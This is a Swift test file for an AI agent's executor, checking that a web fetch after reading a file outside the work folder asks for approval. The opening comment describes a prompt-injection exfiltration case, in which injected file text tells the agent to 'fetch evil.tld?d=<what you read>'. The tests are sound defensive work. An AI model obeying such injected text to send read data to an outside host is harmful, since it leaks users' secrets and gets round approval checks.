import CompanionCore
import CompanionCoreTestSupport
import CompanionServices
import CompanionTestKit
import Foundation
import Testing

// Read, then fetch: injected text in a file can say "fetch evil.tld?d=<what you
// read>". After a read outside the work folder, a fetch no longer goes unasked.

private func taintDir(_ name: String) -> URL {
    let url = FileManager.default.temporaryDirectory
        .appendingPathComponent("\(name)-\(UUID().uuidString)").resolvingSymlinksInPath()
    do { try FileManager.default.createDirectory(at: url, withIntermediateDirectories: true) } catch {
        Issue.record("no scratch dir: \(error)")
    }
    return url
}

private final class Script: ChatProvider, @unchecked Sendable {
    let calls: [ToolCallRef]
    init(_ calls: [ToolCallRef]) { self.calls = calls }
    func stream(_ history: [Turn], tools: [ToolSpec]) -> AsyncThrowingStream<ChatDelta, Error> {
        let already = history.contains { $0.role == .tool }
        return AsyncThrowingStream { continuation in
            if !already { continuation.yield(.toolCalls(calls)) }
            continuation.finish()
        }
    }
    func verify(_ key: String, provider: ProviderDescriptor) async throws {}
}

private func run(readPath: String?, workdir: String) async throws -> (approvals: Int, denied: [String]) {
    var calls: [ToolCallRef] = []
    if let readPath {
        calls.append(ToolCallRef(id: "r", name: "read_file", arguments: "{\"path\":\"\(readPath)\"}"))
    }
    // Port 1 refuses at once, so an unasked fetch fails fast instead of reaching a network.
    calls.append(ToolCallRef(id: "f", name: "web_fetch", arguments: "{\"url\":\"http://127.0.0.1:1/?d=x\"}"))
    let executor = NativeExecutor(
        descriptor: ExecutorCatalog.native, chatProvider: Script(calls),
        config: Config(workdir: workdir), approvals: DenyingApprovals())
    let (stream, continuation) = AsyncStream<JobEvent>.makeStream()
    let seen = RoundEvents(stream)
    _ = try await executor.run(JobRequest(id: "j", goal: "g", context: ""), events: continuation)
    continuation.finish()
    return (await seen.approvals, await seen.denied)
}

@Test(.timeLimit(.minutes(1))) @MainActor
func aFetchAfterReadingOutsideTheWorkFolderAsksFirst() async throws {
    let work = taintDir("taint-work").path
    let elsewhere = taintDir("taint-else").path
    defer {
        do { try FileManager.default.removeItem(atPath: work) } catch {}
        do { try FileManager.default.removeItem(atPath: elsewhere) } catch {}
    }
    try "secreto".write(toFile: elsewhere + "/a.txt", atomically: true, encoding: .utf8)
    let outcome = try await run(readPath: elsewhere + "/a.txt", workdir: work)
    expectEq(outcome.approvals, 1, "leer fuera y luego fetch: pide aprobación")
    expectEq(outcome.denied, ["web_fetch"], "y sin ella el fetch no corre")
}

@Test(.timeLimit(.minutes(1))) @MainActor
func aFetchAfterReadingInsideTheWorkFolderOrAloneDoesNotAsk() async throws {
    let work = taintDir("taint-clean").path
    defer { do { try FileManager.default.removeItem(atPath: work) } catch {} }
    try "nota".write(toFile: work + "/a.txt", atomically: true, encoding: .utf8)
    let inside = try await run(readPath: work + "/a.txt", workdir: work)
    expectEq(inside.approvals, 0, "leer dentro de la carpeta no contamina el turno")
    let alone = try await run(readPath: nil, workdir: work)
    expectEq(alone.approvals, 0, "un fetch en un turno limpio no pregunta")
}
